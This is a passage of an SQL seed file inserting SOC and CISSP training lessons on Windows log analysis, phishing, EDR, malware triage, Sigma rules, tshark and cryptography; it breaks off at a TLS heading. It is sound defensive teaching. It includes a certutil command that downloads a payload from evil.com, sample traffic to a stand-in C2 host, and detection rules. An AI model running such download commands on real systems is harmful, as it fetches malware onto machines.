| Logon from unusual location or time | Potential compromised credentials |
| Account used on multiple devices simultaneously | Credential sharing or theft |
| Privilege escalation (added to admin group) | Potential unauthorised elevation |
| Service account used interactively | Service accounts should not be used by humans |
| Failed MFA followed by successful bypass | MFA fatigue or social engineering |

## Key Takeaways

- RBAC and ABAC are the most commonly deployed models in enterprises.
- RADIUS handles network access; TACACS+ handles device administration; Kerberos handles Windows domain auth.
- 802.1X + NAC ensures only authenticated, healthy devices access the network.
- SOC analysts should monitor for unusual logon patterns, privilege changes, and MFA anomalies.
$md$, 30, 4);

-- ========== BH-SPEC-SOC: Module 3 — Advanced Detection and Analysis ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000053', 'Windows Event Log Analysis',
 'Critical Event IDs, Sysmon analysis, and building detection logic from Windows events.',
$md$
# Windows Event Log Analysis

## Objectives

By the end of this lesson you will be able to:

- Analyse Windows Security events to detect authentication attacks.
- Use Sysmon events to detect process-based threats.
- Build detection logic from event patterns.
- Describe common attack patterns visible in Windows logs.

## Authentication Attack Detection

### Brute Force / Password Spray

**Pattern:** Many Event 4625 (failed logon) in a short window.

- **Brute force** — many failures against **one account** from one or few sources.
- **Password spray** — few failures against **many accounts** (e.g. trying "Password1" on every account).

Detection logic: "More than 20 Event 4625 from the same source IP in 10 minutes" or "More than 10 unique accounts with Event 4625 from the same source in 5 minutes."

### Credential Stuffing

Similar to brute force but uses credentials leaked from other breaches. Pattern: many 4625s with different usernames, often from distributed IPs.

### Lateral Movement with Explicit Credentials

**Event 4648** — "A logon was attempted using explicit credentials." This fires when someone uses `runas` or passes credentials explicitly. Combined with **Event 4624 Logon Type 3** (network logon) on the target, this indicates credential-based lateral movement.

### Pass-the-Hash / Pass-the-Ticket

**Event 4624 Logon Type 9** (NewCredentials) or **Type 3** from unexpected sources. The NTLM authentication package in the event details (rather than Kerberos) may indicate pass-the-hash.

## Sysmon Process Analysis

### Suspicious Process Creation (Sysmon Event 1)

Key fields: `Image` (executable path), `CommandLine` (full command), `ParentImage` (what launched it), `Hashes` (file hash).

| Pattern | Example | Threat |
|---------|---------|--------|
| Office app → cmd.exe/powershell.exe | ParentImage: WINWORD.EXE, Image: cmd.exe | Macro-based malware |
| Encoded PowerShell | CommandLine contains `-enc` or `-EncodedCommand` | Obfuscated malicious script |
| Process from unusual path | Image: C:\Users\Public\svchost.exe | Malware masquerading as system process |
| Living off the land | certutil.exe, mshta.exe, regsvr32.exe, wmic.exe used for download/execution | LOLBin abuse |

### LOLBins (Living Off The Land Binaries)

Attackers use legitimate Windows tools to avoid detection:

| Binary | Legitimate Use | Malicious Use |
|--------|---------------|---------------|
| `certutil.exe` | Certificate management | Download files: `certutil -urlcache -f http://evil.com/payload.exe` |
| `mshta.exe` | Run HTA files | Execute remote scripts |
| `regsvr32.exe` | Register DLLs | Execute arbitrary code via COM scriptlets |
| `wmic.exe` | WMI management | Remote execution, reconnaissance |

## Key Takeaways

- Brute force shows many 4625s against one account; password spray shows failures across many accounts.
- Event 4648 + Event 4624 Type 3 on a target = lateral movement.
- Sysmon Event 1 with full command line is the most valuable detection data source.
- LOLBin abuse is a top technique — monitor certutil, mshta, regsvr32, wmic for unusual usage.
$md$, 35, 1),

('b0000000-0000-4000-8000-000000000053', 'Email Header Analysis and Phishing Investigation',
 'Analyse email headers to trace origins, identify spoofing, and investigate phishing campaigns.',
$md$
# Email Header Analysis and Phishing Investigation

## Objectives

By the end of this lesson you will be able to:

- Read and interpret email headers to trace the path of a message.
- Identify spoofed emails by examining SPF, DKIM, and DMARC results.
- Analyse suspicious URLs and attachments safely.
- Document phishing incidents with IOCs.

## Email Headers

Every email contains headers that record its journey from sender to recipient. Key headers:

| Header | Purpose |
|--------|---------|
| **From** | Claimed sender (can be spoofed) |
| **Return-Path** | Actual envelope sender |
| **Received** | Added by each mail server the message passes through (read bottom to top) |
| **Message-ID** | Unique identifier |
| **X-Originating-IP** | IP address of the sending client |
| **Authentication-Results** | SPF, DKIM, DMARC results |

### Reading the Received Chain

Read `Received:` headers from **bottom to top** — the bottom one is the originating server:

```
Received: from mail.example.com (mail.example.com [93.184.216.34])
    by mx.recipient.com with ESMTPS; Tue, 10 Feb 2026 08:15:00 +0000
```

This tells you: the message came from mail.example.com (IP 93.184.216.34) and was received by mx.recipient.com.

### SPF/DKIM/DMARC in Headers

```
Authentication-Results: mx.recipient.com;
    spf=pass (sender IP is 93.184.216.34) smtp.mailfrom=example.com;
    dkim=pass header.d=example.com;
    dmarc=pass (policy=reject)
```

If any of these show `fail`, the email may be spoofed.

## Phishing Analysis Checklist

1. **Check sender** — does the From address match the organisation? Look for typosquatting (e.g. `examp1e.com`).
2. **Check headers** — does SPF/DKIM pass? Is the originating IP consistent with the claimed sender?
3. **Check URLs** — hover (do not click). Does the URL match the claimed destination? Use URL reputation services.
4. **Check attachments** — what file type? Macros? Submit hash to VirusTotal.
5. **Check urgency/language** — phishing often creates urgency ("Your account will be suspended").
6. **Check for similar emails** — search the SIEM/email gateway for other recipients of the same message.

## Safely Analysing URLs and Attachments

- **URLs:** Use URL scanners (urlscan.io, VirusTotal) to check without visiting.
- **Attachments:** Check file hash on VirusTotal. If unknown, analyse in a sandbox (isolated environment).
- **Never** open suspicious attachments on a production system.

## Key Takeaways

- Read Received headers bottom-to-top to trace the email path.
- SPF/DKIM/DMARC failures in Authentication-Results indicate potential spoofing.
- Phishing analysis: check sender, headers, URLs, attachments, urgency, and scope.
- Use sandboxes and reputation services — never interact with suspicious content on production systems.
$md$, 30, 2),

('b0000000-0000-4000-8000-000000000053', 'Endpoint Detection and Response in Practice',
 'EDR workflows, investigation techniques, and response playbooks for SOC analysts.',
$md$
# Endpoint Detection and Response in Practice

## Objectives

By the end of this lesson you will be able to:

- Describe the EDR investigation workflow for a SOC analyst.
- Analyse process trees to identify malicious activity chains.
- Use EDR search capabilities to hunt across endpoints.
- Execute common response actions through EDR consoles.

## EDR Investigation Workflow

When an EDR alert fires, the SOC analyst follows this workflow:

1. **Review the alert** — what was detected? What rule or behaviour triggered it?
2. **Examine the process tree** — trace the chain: what launched what. A suspicious chain might be: `outlook.exe → cmd.exe → powershell.exe → payload.exe`.
3. **Check the command line** — what arguments were passed? Encoded commands, download URLs, and file paths are critical.
4. **Review network activity** — did the process make outbound connections? To which IPs/domains?
5. **Check file activity** — did it create, modify, or delete files? What are their hashes?
6. **Search across endpoints** — is the same IOC (hash, domain, file path) present on other hosts?
7. **Determine scope** — how many endpoints are affected?
8. **Respond** — isolate, kill, quarantine, collect forensics.

## Process Tree Analysis

A process tree shows the parent-child relationship of processes. Normal patterns:

```
explorer.exe → chrome.exe        (user launched browser — normal)
services.exe → svchost.exe       (system service — normal)
winlogon.exe → userinit.exe      (login process — normal)
```

Suspicious patterns:

```
outlook.exe → cmd.exe → powershell.exe   (email → command execution — likely malware)
svchost.exe → cmd.exe → whoami           (service running recon — likely compromised)
excel.exe → mshta.exe                    (spreadsheet running HTA — macro malware)
```

The key questions: Is the parent-child relationship expected? Is the command line suspicious? Is the file hash known-bad?

## Cross-Endpoint Hunting

EDR consoles allow searching across all managed endpoints:

- **Search by hash:** "Show all endpoints where file hash abc123 has been seen in the last 30 days."
- **Search by domain:** "Show all endpoints that connected to evil-c2.example.com."
- **Search by process name:** "Show all endpoints where certutil.exe was used to download a file."

This scoping determines whether an incident is isolated or widespread.

## Response Playbook: Malware Execution

1. **Isolate** the affected endpoint from the network.
2. **Kill** the malicious process.
3. **Quarantine** the malicious file.
4. **Collect** forensic package (memory dump, logs, process list).
5. **Search** for the file hash and C2 domain across all endpoints.
6. **Block** the hash and C2 domain in EDR and firewall.
7. **Investigate** how the malware was delivered (email? web download? USB?).
8. **Remediate** — remove malware, reset credentials if needed, scan for persistence.
9. **Document** and create incident report.

## Key Takeaways

- Process tree analysis is the core EDR investigation technique — trace parent-child chains.
- Suspicious patterns: Office apps spawning cmd/powershell, services running recon commands.
- Cross-endpoint hunting determines incident scope — search by hash, domain, or behaviour.
- Response follows: isolate → kill → quarantine → collect → search → block → investigate → remediate.
$md$, 30, 3),

('b0000000-0000-4000-8000-000000000053', 'Malware Triage and Sandboxing',
 'Static and dynamic malware analysis, sandbox tools, and IOC extraction.',
$md$
# Malware Triage and Sandboxing

## Objectives

By the end of this lesson you will be able to:

- Distinguish static and dynamic malware analysis.
- Use basic static analysis techniques to assess a suspicious file.
- Describe sandbox analysis and common sandbox tools.
- Extract IOCs from malware analysis results.

## Malware Analysis Levels

| Level | Technique | Skill Required | Depth |
|-------|-----------|---------------|-------|
| **Triage** | File type, hash lookup, strings | Basic | Quick classification |
| **Static analysis** | Disassembly, PE header inspection | Intermediate | Understand capabilities without executing |
| **Dynamic analysis** | Execute in sandbox, observe behaviour | Intermediate | See what the malware actually does |
| **Reverse engineering** | Full disassembly and code analysis | Expert | Complete understanding |

SOC analysts primarily perform **triage** and **dynamic analysis** (sandboxing). Reverse engineering is for dedicated malware analysts.

## Static Analysis (Triage)

Without executing the file:

1. **File type** — check the true file type (not just the extension). A `.pdf` that is actually a `.exe` is suspicious. Use `file` command on Linux.
2. **Hash** — calculate MD5/SHA256 hash and check VirusTotal. If the hash is known-malicious, you have your answer.
3. **Strings** — extract readable text from the file. Look for: URLs, IP addresses, registry paths, file paths, encoded commands, error messages.
4. **PE headers** (for Windows executables) — check compilation timestamp, imported libraries (e.g. importing `WinHttpSendRequest` = network activity; `CryptEncrypt` = encryption).

## Dynamic Analysis (Sandboxing)

Execute the malware in an isolated virtual environment and observe:

| Observable | What It Reveals |
|-----------|----------------|
| **Processes created** | What the malware spawns |
| **Files created/modified** | Dropped payloads, persistence files |
| **Registry changes** | Persistence mechanisms (Run keys, services) |
| **Network connections** | C2 servers, data exfiltration destinations |
| **DNS queries** | C2 domains, DGA (domain generation algorithm) |

### Common Sandbox Tools

| Tool | Type | Notes |
|------|------|-------|
| **Any.Run** | Cloud | Interactive sandbox; free tier available |
| **Joe Sandbox** | Cloud/on-prem | Detailed reports |
| **Cuckoo Sandbox** | Open-source, self-hosted | Highly customisable |
| **Windows Sandbox** | Built into Windows Pro/Enterprise | Quick isolated environment |
| **VirusTotal** | Cloud | Runs samples through 70+ AV engines; shows behaviour |

## IOC Extraction from Analysis

| IOC Type | Source |
|----------|--------|
| File hash (MD5, SHA256) | Static analysis |
| C2 IP/domain | Network connections in sandbox |
| Dropped file paths | File activity in sandbox |
| Registry persistence keys | Registry changes in sandbox |
| Mutex names | Process analysis in sandbox |
| User-Agent string | Network capture in sandbox |

## Key Takeaways

- Triage (hash lookup, strings) takes minutes and handles most samples.
- Sandboxes safely execute malware to observe behaviour.
- Extract IOCs from both static and dynamic analysis to feed back into detection.
- Never execute suspicious files outside of an isolated sandbox environment.
$md$, 30, 4);

-- ========== BH-SPEC-SOC: Module 4 — Cloud SOC and Detection Engineering ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000054', 'Cloud SOC and Monitoring',
 'Cloud-native logging, monitoring services, and cloud incident detection.',
$md$
# Cloud SOC and Monitoring

## Objectives

By the end of this lesson you will be able to:

- Identify key cloud logging services (AWS CloudTrail, Azure Activity Log, GCP Cloud Audit Logs).
- Describe how cloud events flow into a SIEM.
- Detect common cloud threats using cloud-native telemetry.

## Cloud Logging Services

| Cloud | Service | What It Logs |
|-------|---------|-------------|
| **AWS** | CloudTrail | API calls (who did what, when, from where) |
| **AWS** | VPC Flow Logs | Network traffic metadata |
| **AWS** | GuardDuty | Automated threat findings |
| **Azure** | Activity Log | Management-plane operations |
| **Azure** | Sign-in Logs | Authentication events |
| **Azure** | NSG Flow Logs | Network traffic metadata |
| **GCP** | Cloud Audit Logs | Admin and data access activity |

### CloudTrail Events to Monitor

| Event | Why |
|-------|-----|
| `ConsoleLogin` without MFA | Admin access without strong authentication |
| `CreateUser`, `AttachUserPolicy` | Potential persistence — new admin account |
| `StopLogging` | Attacker covering tracks |
| `PutBucketPolicy` (public access) | Data exposure |
| `RunInstances` in unusual region | Cryptomining |

## Integrating Cloud Logs with SIEM

Cloud logs are forwarded to the SIEM via:
- **AWS:** CloudTrail → S3 → SIEM ingestion (or CloudTrail → EventBridge → SIEM).
- **Azure:** Activity Log → Event Hub → SIEM connector.
- **GCP:** Cloud Audit Logs → Pub/Sub → SIEM.

Once in the SIEM, cloud events are correlated with on-premises events for unified detection.

## Common Cloud Threats

| Threat | Detection |
|--------|-----------|
| **Credential compromise** | Impossible travel (login from two countries in 30 minutes) |
| **Privilege escalation** | `AttachUserPolicy` with AdministratorAccess by non-admin |
| **Data exfiltration** | Large S3 download from unusual IP |
| **Cryptomining** | New GPU instances in unusual regions |
| **Logging disabled** | `StopLogging` or `DeleteTrail` events |

## Key Takeaways

- CloudTrail (AWS), Activity Log (Azure), and Cloud Audit Logs (GCP) are the primary cloud log sources.
- Forward cloud logs to SIEM for unified correlation with on-premises events.
- Monitor for credential compromise, privilege escalation, data exposure, and logging tampering.
$md$, 30, 1),

('b0000000-0000-4000-8000-000000000054', 'Detection Engineering Fundamentals',
 'Detection lifecycle, Sigma rule syntax, rule testing, and detection coverage mapping.',
$md$
# Detection Engineering Fundamentals

## Objectives

By the end of this lesson you will be able to:

- Describe the detection engineering lifecycle.
- Write basic Sigma detection rules.
- Explain how Sigma rules are converted to SIEM queries.
- Map detections to the MITRE ATT&CK framework.
- Conduct a detection gap analysis.

## Detection Engineering Lifecycle

1. **Threat research** — identify the attack technique to detect (e.g. via threat intelligence, ATT&CK, or incident post-mortems).
2. **Data source identification** — what logs contain evidence of this technique? (Windows Security, Sysmon, firewall, proxy, cloud logs)
3. **Detection logic design** — write the rule: what fields, values, and patterns to match.
4. **Testing** — test against known-good samples (should not trigger) and known-bad samples (should trigger).
5. **Tuning** — adjust thresholds and exclusions based on false positive rate in production.
6. **Deployment** — push to SIEM/EDR.
7. **Maintenance** — review and update as techniques evolve.

## Sigma Rules

**Sigma** is an open, vendor-neutral format for writing detection rules. A single Sigma rule can be converted to queries for Splunk, Elastic, Microsoft Sentinel, QRadar, and others.

### Sigma Rule Structure (YAML)

```yaml
title: Suspicious Encoded PowerShell Execution
id: a1234567-abcd-1234-abcd-123456789abc
status: test
description: Detects PowerShell execution with encoded commands
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains:
            - '-enc'
            - '-EncodedCommand'
            - '-e '
    condition: selection
falsepositives:
    - Legitimate admin scripts using encoded commands
level: high
tags:
    - attack.execution
    - attack.t1059.001
```

### Key Fields

| Field | Purpose |
|-------|---------|
| `title` | Descriptive name |
| `logsource` | What type of log and platform (category + product) |
| `detection` | The matching logic (field names, values, operators) |
| `condition` | Combines selections (AND, OR, NOT) |
| `level` | Severity (informational, low, medium, high, critical) |
| `tags` | MITRE ATT&CK mapping (tactic + technique) |

### Sigma Modifiers

- `|contains` — field value contains the string.
- `|endswith` — field value ends with the string.
- `|startswith` — field value starts with the string.
- `|re` — regular expression match.

### Converting Sigma to SIEM Queries

The `sigma-cli` tool converts Sigma rules to SIEM-specific queries:

```
sigma convert -t splunk -p sysmon rule.yml
# Output: Image="*\\powershell.exe" (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*")
```

This means: write once in Sigma, deploy to any SIEM.

## Detection Coverage Mapping

Map your detection rules to MITRE ATT&CK techniques to find gaps:

| ATT&CK Technique | Detection Rule? | Data Source |
|-------------------|----------------|-------------|
| T1059.001 — PowerShell | Yes | Sysmon Event 1 |
| T1053.005 — Scheduled Task | Yes | Windows Security 4698 |
| T1548.002 — UAC Bypass | **No — gap** | Need Sysmon + specific detection |
| T1071.001 — Web Protocols (C2) | Partial | Proxy logs, but no beacon detection |

A gap analysis reveals which techniques you cannot detect — then you prioritise building those detections.

## Key Takeaways

- Detection engineering follows a lifecycle: research → design → test → tune → deploy → maintain.
- Sigma is the vendor-neutral standard for detection rules — write once, convert to any SIEM.
- Know the Sigma YAML structure: logsource, detection (selection + condition), level, tags.
- Map detections to ATT&CK to identify gaps in your detection coverage.
$md$, 35, 2),

('b0000000-0000-4000-8000-000000000054', 'Detection Tools: tshark and Sigma Rules',
 'Hands-on introduction to tshark packet analysis and Sigma rule authoring for the capstone.',
$md$
# Detection Tools: tshark and Sigma Rules

## Objectives

By the end of this lesson you will be able to:

- Use tshark to analyse PCAP files from the command line.
- Extract specific fields from packet data using tshark.
- Write complete Sigma detection rules in YAML format.
- Test and validate Sigma rules.

## tshark — Command-Line Packet Analysis

tshark is the command-line version of Wireshark. It is useful for scripting, automation, and analysing large captures without a GUI.

### Basic Usage

```
tshark -r capture.pcap                   # Read and display all packets
tshark -r capture.pcap -c 20             # Show first 20 packets only
tshark -r capture.pcap -q -z conv,tcp    # TCP conversation summary (quiet mode + statistics)
tshark -r capture.pcap -q -z io,phs      # Protocol hierarchy statistics
```

### Display Filters

Same syntax as Wireshark:

```
tshark -r capture.pcap -Y "http.request"              # Show HTTP requests only
tshark -r capture.pcap -Y "dns"                        # Show DNS only
tshark -r capture.pcap -Y "ip.addr == 10.0.0.5"       # Traffic from/to specific IP
tshark -r capture.pcap -Y "tcp.port == 4444"           # Traffic on a specific port
```

### Field Extraction

Extract specific fields in tabular format:

```
tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
```

Output:
```
10.0.0.5    evil-c2.example.com    /beacon
10.0.0.5    evil-c2.example.com    /exfil?data=abc
```

### DNS Query Extraction

```
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e ip.src -e dns.qry.name
```

Output:
```
10.0.0.5    evil-c2.example.com
10.0.0.5    updates.legit-software.com
```

## Writing Sigma Rules — Practical Guide

### Example 1: Detect Data Exfiltration via DNS

```yaml
title: Excessive DNS Queries to Single Domain
id: b2345678-bcde-2345-bcde-234567890bcd
status: test
description: Detects unusually high DNS query volume to a single domain, possible DNS tunnelling
logsource:
    category: dns_query
    product: windows
detection:
    selection:
        QueryName|contains: '.'
    filter:
        QueryName|endswith:
            - '.microsoft.com'
            - '.windows.com'
            - '.windowsupdate.com'
    condition: selection and not filter
    timeframe: 5m
    count(QueryName) > 100
falsepositives:
    - CDN domains with many subresources
    - Software update checks
level: medium
tags:
    - attack.exfiltration
    - attack.t1048.003
```

### Example 2: Detect Service Account Interactive Logon

```yaml
title: Service Account Used for Interactive Logon
id: c3456789-cdef-3456-cdef-345678901cde
status: test
description: Detects when a service account logs on interactively, which should not happen
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 2
        TargetUserName|startswith: 'svc-'
    condition: selection
falsepositives:
    - Legitimate administrative use of service accounts (should be eliminated)
level: high
tags:
    - attack.credential_access
    - attack.t1078.002
```

### Validating Sigma Rules

- Check YAML syntax (correct indentation, no tabs).
- Verify `logsource` matches available data.
- Test with known-bad data (should trigger) and known-good data (should not trigger).
- Review `falsepositives` — document expected noise.

## Key Takeaways

- tshark analyses PCAPs from the command line — use `-Y` for display filters, `-T fields -e` for extraction.
- `-q -z conv,tcp` gives a conversation summary; `-q -z io,phs` gives protocol hierarchy.
- Sigma rules follow a specific YAML structure: title, logsource, detection, condition, level, tags.
- Write detection logic in the selection block; combine with condition; document false positives.
$md$, 35, 3);

-- ========== BH-ADV: Module 3 — Asset Security and Cryptography ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000063', 'Asset Security and Data Protection',
 'Data classification, lifecycle, roles, retention, privacy, and secure disposal for CISSP Domain 2.',
$md$
# Asset Security and Data Protection

## Objectives

By the end of this lesson you will be able to:

- Apply data classification schemes and describe data roles.
- Describe the data lifecycle and retention requirements.
- Explain privacy concepts including PII, PHI, and data protection regulations.
- Describe secure data disposal methods.

## Data Classification

Classification assigns a sensitivity label to data, which determines handling, storage, encryption, and access requirements.

### Government Classification

| Level | Definition |
|-------|-----------|
| **Top Secret** | Exceptionally grave damage to national security if disclosed |
| **Secret** | Serious damage to national security |
| **Confidential** | Damage to national security |
| **Unclassified** | No damage; may still be sensitive (e.g. FOUO — For Official Use Only) |

### Commercial Classification

| Level | Definition | Example |
|-------|-----------|---------|
| **Restricted** | Highest sensitivity; severe business impact | Trade secrets, M&A plans, cryptographic keys |
| **Confidential** | Significant impact | Customer PII, financial data, contracts |
| **Internal** | Minor impact | Internal policies, org charts, meeting notes |
| **Public** | No impact | Marketing materials, press releases |

## Data Roles

| Role | Responsibility |
|------|---------------|
| **Data owner** | Business leader who determines classification and access policies |
| **Data custodian** | IT/security staff who implement technical controls (encryption, backups, access) |
| **Data controller** (GDPR) | Organisation that determines why and how personal data is processed |
| **Data processor** (GDPR) | Organisation that processes data on behalf of the controller |
| **Data steward** | Ensures data quality, accuracy, and compliance |

## Data Lifecycle

1. **Create / Collect** — classify at creation; apply labels and initial controls.
2. **Store** — encrypt at rest; apply access controls; store in approved locations.
3. **Use** — enforce need-to-know; monitor access; apply DLP.
4. **Share** — encrypt in transit; verify recipient authorisation; apply rights management.
5. **Archive** — move to long-term storage; maintain classification; ensure retrievability.
6. **Destroy** — securely dispose when retention period expires.

## Data Retention and Disposal

Retention policies define how long data must be kept. Drivers: legal requirements (tax records: 7 years), regulations (HIPAA: 6 years), business needs, litigation hold.

### Secure Disposal Methods

| Method | Media | Description |
|--------|-------|-------------|
| **Overwriting** | HDD | Write patterns over data (e.g. DoD 5220.22-M: 3-pass overwrite) |
| **Degaussing** | Magnetic media | Strong magnetic field destroys data |
| **Crypto-shredding** | Encrypted media | Destroy the encryption key — data becomes unrecoverable |
| **Physical destruction** | Any | Shredding, incineration, pulverisation |

**SSD note:** Overwriting is unreliable on SSDs due to wear levelling. Use crypto-shredding (encrypt then destroy key) or physical destruction.

## Privacy

- **PII** (Personally Identifiable Information) — data that can identify an individual (name, SSN, email, biometrics).
- **PHI** (Protected Health Information) — health-related PII (HIPAA).
- **Anonymisation** — irreversibly remove identifying information.
- **Pseudonymisation** — replace identifiers with tokens (reversible with a key).
- **Tokenisation** — replace sensitive data with a non-sensitive token stored in a secure vault.

## Key Takeaways

- Classification drives all downstream handling decisions — classify at creation.
- Data owners decide policy; custodians implement controls.
- Know the data lifecycle: create → store → use → share → archive → destroy.
- Secure disposal must match the media type — crypto-shredding for SSDs.
$md$, 35, 1),

('b0000000-0000-4000-8000-000000000063', 'Security Models and Evaluation Criteria',
 'Bell-LaPadula, Biba, Clark-Wilson, Common Criteria, and trusted computing for CISSP Domain 3.',
$md$
# Security Models and Evaluation Criteria

## Objectives

By the end of this lesson you will be able to:

- Describe formal security models: Bell-LaPadula, Biba, Clark-Wilson, and Brewer-Nash.
- Explain Common Criteria and Evaluation Assurance Levels (EAL).
- Describe trusted computing concepts: TPM, secure boot, HSM.

## Security Models

### Bell-LaPadula (Confidentiality)

Designed to protect classified information. Two rules:

- **Simple Security Rule (No Read Up)** — a subject cannot read data at a higher classification level.
- **Star Property (No Write Down)** — a subject cannot write data to a lower classification level.

This prevents information from flowing downward (leaking secrets to lower-classified systems).

### Biba (Integrity)

The inverse of Bell-LaPadula, focused on data integrity:

- **Simple Integrity Rule (No Read Down)** — a subject cannot read data at a lower integrity level.
- **Star Integrity Property (No Write Up)** — a subject cannot write data to a higher integrity level.

This prevents corruption from flowing upward (unreliable data contaminating trusted systems).

### Clark-Wilson (Integrity — Commercial)

Designed for commercial environments. Uses:

- **Constrained Data Items (CDIs)** — data that must maintain integrity.
- **Transformation Procedures (TPs)** — the only authorised way to modify CDIs.
- **Integrity Verification Procedures (IVPs)** — check that CDIs remain valid.
- **Separation of duties** — no single person controls a complete transaction.

### Brewer-Nash (Chinese Wall)

Prevents conflicts of interest. A consultant who accesses data from Company A (in the banking sector) cannot then access data from Company B (another bank). Access is dynamically restricted based on what the subject has already accessed.

## Common Criteria (ISO 15408)

An international framework for evaluating the security of IT products. Key concepts:

- **Target of Evaluation (TOE)** — the product being evaluated.
- **Protection Profile (PP)** — requirements document specifying what the product must do.
- **Security Target (ST)** — vendor's description of what the product does and how.
- **Evaluation Assurance Level (EAL)** — 1 (lowest) to 7 (highest).

| EAL | Description |
|-----|-------------|
| EAL 1 | Functionally tested |
| EAL 2 | Structurally tested |
| EAL 3 | Methodically tested and checked |
| EAL 4 | Methodically designed, tested, and reviewed (most common for commercial products) |
| EAL 5-7 | Formally verified (increasingly rigorous; rare outside military) |

## Trusted Computing

| Component | Purpose |
|-----------|---------|
| **TPM (Trusted Platform Module)** | Hardware chip that stores cryptographic keys, performs encryption, and measures system integrity |
| **Secure Boot** | UEFI feature that only allows signed bootloaders and OS kernels to execute |
| **Measured Boot** | Records integrity measurements of boot components in the TPM; allows remote attestation |
| **HSM (Hardware Security Module)** | Dedicated hardware for key generation, storage, and cryptographic operations at high speed |

## Key Takeaways

- Bell-LaPadula = confidentiality (no read up, no write down). Biba = integrity (no read down, no write up).
- Clark-Wilson enforces integrity through controlled access to data via authorised procedures.
- Common Criteria EAL levels rate the assurance of IT product security (EAL4 is the commercial standard).
- TPM, Secure Boot, and HSM provide hardware-based security foundations.
$md$, 30, 2),

('b0000000-0000-4000-8000-000000000063', 'Cryptographic Systems and PKI',
 'Cryptography at CISSP depth: algorithms, PKI, key management, and digital signatures.',
$md$
# Cryptographic Systems and PKI

## Objectives

By the end of this lesson you will be able to:

- Compare symmetric and asymmetric algorithms at CISSP depth.
- Describe the PKI trust model: CAs, certificates, and revocation.
- Explain key management lifecycle.
- Describe digital signatures and their role in non-repudiation.

## Symmetric Algorithms

| Algorithm | Key Size | Block Size | Status |
|-----------|---------|-----------|--------|
| **AES** | 128, 192, 256 | 128 | Current standard; approved by NIST |
| **3DES** | 168 (effective 112) | 64 | Deprecated; too slow; retire by 2023 (NIST) |
| **DES** | 56 | 64 | Broken; never use |
| **ChaCha20** | 256 | Stream cipher | Modern alternative to AES; used in TLS |

AES modes: **CBC** (chaining, needs IV), **GCM** (authenticated encryption — provides both confidentiality and integrity), **CTR** (counter mode, parallelisable).

## Asymmetric Algorithms

| Algorithm | Use | Key Size | Status |
|-----------|-----|---------|--------|
| **RSA** | Encryption, digital signatures | 2048–4096 | Standard; 2048 minimum |
| **ECC** | Encryption, signatures, key exchange | 256–521 | Smaller keys, same security as larger RSA |
| **Diffie-Hellman** | Key exchange only | 2048+ | Establishes shared secret over insecure channel |
| **DSA** | Digital signatures only | 2048–3072 | Standardised by NIST |

## Public Key Infrastructure (PKI)

PKI provides the trust framework for asymmetric cryptography in practice.

### Components

| Component | Role |
|-----------|------|
| **Certificate Authority (CA)** | Issues and signs digital certificates |
| **Registration Authority (RA)** | Verifies identity of certificate requesters |
| **Certificate** | Binds a public key to an identity (X.509 format) |
| **CRL (Certificate Revocation List)** | List of revoked certificates |
| **OCSP (Online Certificate Status Protocol)** | Real-time certificate validity check |

### Certificate Chain of Trust

Root CA → Intermediate CA → End-entity certificate. Browsers trust root CAs that are pre-installed in their trust store. If any certificate in the chain is invalid or revoked, the entire chain fails.

## Key Management Lifecycle

1. **Generation** — use strong random number generators; appropriate key length.
2. **Distribution** — secure key exchange (Diffie-Hellman, out-of-band, key wrapping).
3. **Storage** — protect keys at rest (HSM, TPM, encrypted key store).
4. **Usage** — enforce access controls; monitor usage.
5. **Rotation** — change keys periodically to limit exposure.
6. **Revocation** — invalidate compromised keys immediately.
7. **Destruction** — securely destroy keys when no longer needed (crypto-shredding).

## Digital Signatures

A digital signature provides: **integrity** (data not modified), **authentication** (sender is who they claim), and **non-repudiation** (sender cannot deny sending).

Process:
1. Sender hashes the message (e.g. SHA-256).
2. Sender encrypts the hash with their **private key** → this is the signature.
3. Recipient decrypts the signature with the sender's **public key** → gets the hash.
4. Recipient hashes the received message and compares. If hashes match → integrity and authenticity confirmed.

## Key Takeaways

- AES (symmetric) and RSA/ECC (asymmetric) are the current standards. Know key sizes.
- PKI trust chain: Root CA → Intermediate CA → End certificate. Revocation via CRL or OCSP.
- Key management lifecycle: generate → distribute → store → use → rotate → revoke → destroy.
- Digital signatures use the sender's private key for signing and public key for verification.
$md$, 35, 3);

-- ========== BH-ADV: Module 4 — Network Security and Software Security ==========
INSERT INTO public.lessons (module_id, title, description, content_markdown, duration_minutes, order_index) VALUES
('b0000000-0000-4000-8000-000000000064', 'Communication and Network Security',
 'Secure network architecture, protocols, and attacks for CISSP Domain 4.',
$md$
# Communication and Network Security

## Objectives

By the end of this lesson you will be able to:

- Describe secure network architecture principles at CISSP depth.
- Explain secure communication protocols (IPSec, TLS, SSH).
- Identify common network attacks and their mitigations.
- Describe network segmentation strategies including micro-segmentation and SDN.

## Secure Network Architecture

### Defence in Depth for Networks

- **Perimeter** — firewall, IDS/IPS, DDoS protection.
- **DMZ** — screened subnet for public-facing services (web servers, email gateways).
- **Internal segmentation** — VLANs, internal firewalls, ACLs separate departments and security zones.
- **Micro-segmentation** — granular policies between individual workloads (especially in cloud/virtualised environments).
- **Zero trust network** — verify every connection regardless of location; no implicit trust.

### Converged Protocols

| Protocol | Description |
|----------|-------------|
| **FCoE** (Fibre Channel over Ethernet) | Storage traffic on Ethernet (converges SAN and LAN) |
| **iSCSI** | SCSI storage protocol over IP |
| **VoIP** | Voice over IP (SIP, RTP) — requires QoS and VLAN isolation |

## Secure Communication Protocols

### IPSec

Operates at Layer 3. Two modes:
- **Transport mode** — encrypts only the payload (original IP header preserved). Used for host-to-host.
- **Tunnel mode** — encrypts the entire original packet and adds a new IP header. Used for VPNs.

Components:
- **AH (Authentication Header)** — integrity and authentication (no encryption).
- **ESP (Encapsulating Security Payload)** — integrity, authentication, **and encryption**.
- **IKE (Internet Key Exchange)** — negotiates the security association (SA).

### TLS (Transport Layer Security)

